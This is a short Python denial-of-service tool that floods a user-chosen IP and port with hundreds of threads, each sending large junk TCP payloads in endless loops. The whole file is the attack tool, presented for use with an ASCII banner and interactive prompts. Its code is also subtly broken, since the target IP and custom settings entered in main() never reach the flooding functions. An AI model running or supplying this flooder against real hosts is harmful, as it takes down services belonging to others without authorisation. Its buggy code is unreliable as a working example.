'''
Dos(Raw)
'''

import socket
import threading

IP = ''
PACKET_SIZE = 60000
N_OF_THREADS = 500

def credintials():# :>
    print(' _____       ______                 _      ')
    print('|  __ \     |  ____|               | |     ')
    print('| |  | |_ __| |__   ___ _ __   ___ | |_    ')
    print("| |  | | '__|  __| / _ \ '_ \ / _ \| __|   ")
    print('| |__| | |  | |___|  __/ | | | (_) | |_    ')
    print('|_____/|_|  |______\___|_| |_|\___/ \__|   ')
    print(' ______ ______ ______ ______ ______ ______ ')
    print('|______|______|______|______|______|______|')
    print('|  __ \ / __ \ / ____|                     ')
    print('| |  | | |  | | (___                       ')
    print('| |  | | |  | |\___ \                      ')
    print('| |__| | |__| |____) |                     ')
    print('|_____/ \____/|_____/                      ')
    print('\n\n\n\n\n')

    
#main static dos function       
def static_port_dos_main(IP , port):
    global PACKET_SIZE
    while True:
        sc = socket.socket()
        try:
            sc.connect((IP , port))
        except:
            pass

        while True:
            dt = 'q'*PACKET_SIZE
            try:
                sc.send(dt.encode('utf-8'))               
            except:
                sc.close()
                break    
#Just creates threads for static dos
def static_port_dos(port):
    global N_OF_THREADS,IP    
    threads_pool = []    
    for i in range(N_OF_THREADS):
        threads_pool.append(threading.Thread(target = static_port_dos_main, args=(IP,port)))
        
    for i in range(N_OF_THREADS):
        try:
            threads_pool[i].start()
        except:
            threads_pool.remove(i)
            pass
    print(len(threads_pool),'threads active')
    
    for i in range(len(threads_pool)):
        try:
            threads_pool[i].join()
        except:
            pass

#def dynamic_port_dos(start_port,end_port):
     

def main():
    
    PR = int(input("Port : "))
    IP = input("IP : ")
    ps = int(input("Packet size(0 if default): "))
    no = int(input("Number of threads(0 if default): "))
    print('\n')
    if ps > 0:
        PACKET_SIZE = ps
        
    if no > 0:
        N_OF_THREADS = no
        
    static_port_dos(PR)


if __name__ == '__main__':
    credintials()
    main()

